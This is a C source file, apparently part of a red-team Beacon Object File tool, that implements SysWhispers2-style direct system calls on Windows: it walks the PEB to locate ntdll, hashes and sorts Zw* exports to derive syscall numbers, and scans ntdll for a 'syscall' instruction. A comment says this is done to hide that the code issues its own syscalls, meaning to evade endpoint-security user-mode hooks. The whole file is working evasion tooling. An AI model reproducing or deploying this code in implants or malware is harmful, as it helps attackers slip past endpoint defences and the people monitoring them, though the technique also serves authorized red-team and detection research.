#include "../include/syscalls.h"

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

SW2_SYSCALL_LIST SW2_SyscallList __attribute__ ((section(".data")));
PVOID SyscallAddress __attribute__ ((section(".data"))) = NULL;

__attribute__((naked)) void DoSysenter(void)
{
#ifdef _WIN64
    __asm__("DoSysenter: \n\
        syscall \n\
        ret \n\
    ");
#else
    __asm__("DoSysenter: \n\
      sysenter \n\
      ret \n\
    ");
#endif
}

/*
 * the idea here is to find a 'syscall' instruction in 'ntdll.dll'
 * so that we can call it from our code and try to hide the fact
 * that we call our own syscalls
 */
PVOID GetSyscallAddress(void)
{
    // Return early if the SyscallAddress is already defined
    if (SyscallAddress) return SyscallAddress;

    // set the fallback as the default
    SyscallAddress = (PVOID)DoSysenter;

    // find the address of NTDLL
    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, first_LdrEntry_address;
    peb_address = GetLocalPEB();

#if _WIN64
    ldr_pointer = peb_address + 0x18;
#else
    ldr_pointer = peb_address + 0xc;
#endif

    ldr_address = *(PVOID*)ldr_pointer;

#if _WIN64
    module_list_pointer = ldr_address + 0x20;
#else
    module_list_pointer = ldr_address + 0x14;
#endif

    first_LdrEntry_address = *(PVOID*)module_list_pointer;
    struct LDR_DATA_TABLE_ENTRY* LdrEntry = (struct LDR_DATA_TABLE_ENTRY*)first_LdrEntry_address;

    BOOL found_it = FALSE;
    while (TRUE)
    {
        if (!MSVCRT$_wcsicmp(L"ntdll.dll", LdrEntry->BaseDllName.Buffer))
        {
            found_it = TRUE;
            break;
        }
        LdrEntry = (struct LDR_DATA_TABLE_ENTRY*)LdrEntry->InMemoryOrderLinks.Flink;
        if (LdrEntry == first_LdrEntry_address)
            break;
    }
    if (!found_it)
        return SyscallAddress;

    // try to find a 'syscall' instruction inside of NTDLL's code section

    PVOID DllBase = LdrEntry->DllBase;
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
    PIMAGE_NT_HEADERS NtHeaders = SW2_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
    PVOID BaseOfCode = SW2_RVA2VA(PVOID, DllBase, NtHeaders->OptionalHeader.BaseOfCode);
    ULONG32 SizeOfCode = NtHeaders->OptionalHeader.SizeOfCode;

#ifdef _WIN64
    BYTE syscall_code[] = { 0xf, 0x5, 0xc3 };
#else
    BYTE syscall_code[] = { 0xf, 0x34, 0xc3 };
#endif

    PVOID CurrentAddress = BaseOfCode;
    while ((ULONGSIZE)CurrentAddress < (ULONGSIZE)BaseOfCode + SizeOfCode - sizeof(syscall_code) + 1)
    {
        if (!MSVCRT$strncmp((PVOID)syscall_code, CurrentAddress, sizeof(syscall_code)))
        {
            // found 'syscall' instruction in ntdll
            SyscallAddress = CurrentAddress;
            return SyscallAddress;
        }
        CurrentAddress = (PVOID)((ULONGSIZE)CurrentAddress + 1);
    }
    // syscall entry not found, using fallback
    return SyscallAddress;
}

DWORD SW2_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW2_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONGSIZE)FunctionName + i++);
        Hash ^= PartialName + SW2_ROR8(Hash);
    }

    return Hash;
}

BOOL SW2_PopulateSyscallList(void)
{
    // Return early if the list is already populated.
    if (SW2_SyscallList.Count) return TRUE;

    PSW2_PEB Peb = (PSW2_PEB)READ_MEMLOC(PEB_OFFSET);
    PSW2_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PSW2_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW2_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW2_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = SW2_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
    }

    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW2_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    // Populate SW2_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PSW2_SYSCALL_ENTRY Entries = SW2_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = SW2_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        // Is this a system call?
        if (*(USHORT*)FunctionName == 0x775a)
        {
            Entries[i].Hash = SW2_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == SW2_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);

    // Save total number of system calls found.
    SW2_SyscallList.Count = i;

    // Sort the list by address in ascending order.
    for (DWORD i = 0; i < SW2_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SW2_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                // Swap entries.
                SW2_SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    return TRUE;
}

EXTERN_C DWORD SW2_GetSyscallNumber(DWORD FunctionHash)
{
    if (!SW2_PopulateSyscallList())
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "SW2_PopulateSyscallList failed\n"
        );
        return -1;
    }

    for (DWORD i = 0; i < SW2_SyscallList.Count; i++)
    {
        if (FunctionHash == SW2_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }
#ifdef BOF
    BeaconPrintf(CALLBACK_ERROR,
#else
    printf(
#endif
        "syscall with hash 0x%lx not found\n",
        FunctionHash
    );

    return -1;
}
